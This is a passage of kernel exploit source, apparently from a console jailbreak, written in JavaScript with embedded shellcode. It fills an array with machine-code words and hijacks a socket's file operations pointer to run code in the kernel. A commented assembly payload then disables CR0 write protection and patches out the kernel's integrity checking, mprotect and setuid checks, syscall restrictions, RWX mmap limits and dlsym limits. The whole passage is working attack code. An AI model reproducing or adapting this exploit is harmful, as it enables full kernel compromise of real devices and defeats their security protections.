  exec_writer[61] = 0x66000000;
  exec_writer[62] = 0x04B987C7;
  exec_writer[63] = 0x90900000;
  exec_writer[64] = 0xBD87C766;
  exec_writer[65] = 0x90000004;
  exec_writer[66] = 0x87C76690;
  exec_writer[67] = 0x000004C6;
  exec_writer[68] = 0x87C6E990;
  exec_writer[69] = 0x001D2336;
  exec_writer[70] = 0x3987C637;
  exec_writer[71] = 0x37001D23;
  exec_writer[72] = 0xC187C766;
  exec_writer[73] = 0x9000094E;
  exec_writer[74] = 0x87C766E9;
  exec_writer[75] = 0x0009547B;
  exec_writer[76] = 0x87C7E990;
  exec_writer[77] = 0x002F2C20;
  exec_writer[78] = 0xC3C03148;
  exec_writer[79] = 0x7087C748;
  exec_writer[80] = 0x02011258;
  exec_writer[81] = 0x48000000;
  exec_writer[82] = 0xB192B78D;
  exec_writer[83] = 0x89480006;
  exec_writer[84] = 0x125878B7;
  exec_writer[85] = 0x9C87C701;
  exec_writer[86] = 0x01011258;
  exec_writer[87] = 0x48000000;
  exec_writer[88] = 0x0100000D;
  exec_writer[89] = 0xC0220F00;
  exec_writer[90] = 0x8080B848;
  exec_writer[91] = 0x80808080;
  exec_writer[92] = 0x90C38080;

  p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
  p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
  p.write8(write_address.add32(0x51), fix_these_sockets_ptr);

  p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
  p.write8(write_address.add32(0x85), socketops);
  p.write8(write_address.add32(0x92), kernel_base);

  p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
  kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
  chain.syscall(54, target_socket, 0x20001111, 0);
  //alert("executed in kernel");
  //p.write8(0, 0);
}
/*
    - assemble & take every 4 bytes, byteswap and assign them to exec_writer
    - overwrite dynamic stuff after
*/
/*
//spam malloc, this should not be required anymore
push rbp
push rbx
push r12  

mov rbx, 0x1111111111111111
mov rbp, 0x2222222222222222
xor r12, r12

kmalloc_loop:
	mov edi, 0xC0
  mov rsi, rbx
	mov edx, 2
  call rbp
	add r12, 0x1
  cmp r12, 0x500
  jne kmalloc_loop

pop r12
pop rbx
pop rbp

//kill all of our socket file*'s just in case
//get thr pointer
mov rax, qword ptr gs:[0x0]
//get proc pointer
mov rax, qword ptr [rax + 0x8]
//get filedesc pointer
mov rax, qword ptr [rax + 0x48]
//get file pointer pointer
mov rax, qword ptr [rax + 0x0]

mov rcx, 0x3333333333333333
mov rdi, 0x2BE
xor rsi, rsi
loop_check:
  cmp rsi, rdi
  jge end
  mov edx, dword ptr [rcx + 0x4 * rsi]
  mov qword ptr [rax + rdx * 0x8], 0x0
  add rsi, 0x1
  jmp loop_check

end:

//socketops field pointer
mov rdi, 0x4444444444444444
//original socketops pointer
mov rsi, 0x5555555555555555 
mov qword ptr [rdi], rsi
//kernel base
mov rdi, 0x6666666666666666 

//disable wp
mov rax, cr0
and rax, 0xFFFFFFFFFFFEFFFF
mov cr0, rax

//sysveri just die
mov byte ptr [rdi + 0x63a160], 0xC3
mov dword ptr [rdi + 0x63acc0], 0xC3C03148
mov dword ptr [rdi + 0x639f10], 0xC3C03148
mov dword ptr [rdi + 0x63a6e0], 0xC3C03148
mov byte ptr [rdi + 0x267b5c0], 0x00

//mprotect
mov rsi, 0x8B49909090909090
mov qword ptr [rdi + 0x264C08], rsi

//setuid
mov dword ptr [rdi + 0x87B70], 0xB8

//syscall everywhere
mov dword ptr [rdi + 0x490], 0x0
mov word ptr [rdi + 0x4B9], 0x9090
mov word ptr [rdi + 0x4BD], 0x9090
mov word ptr [rdi + 0x4C6], 0xE990

//rwx mmap
mov byte ptr [rdi + 0x1D2336], 0x37
mov byte ptr [rdi + 0x1D2339], 0x37

//patch load prx
mov word ptr [rdi + 0x94EC1], 0xE990

//dlsym
mov word ptr [rdi + 0x9547B], 0xE990
mov dword ptr [rdi + 0x2F2C20], 0xC3C03148

//syscall 11
mov qword ptr [rdi + 0x1125870], 0x2
lea rsi, [rdi + 0x6B192]
mov qword ptr [rdi + 0x1125878], rsi
mov dword ptr [rdi + 0x112589C], 0x1

//enable wp
or rax, 0x10000
mov cr0, rax
mov rax, 0x8080808080808080
ret
*/


//rdi
//rsi
//rdx
//rcx
//r8
//r9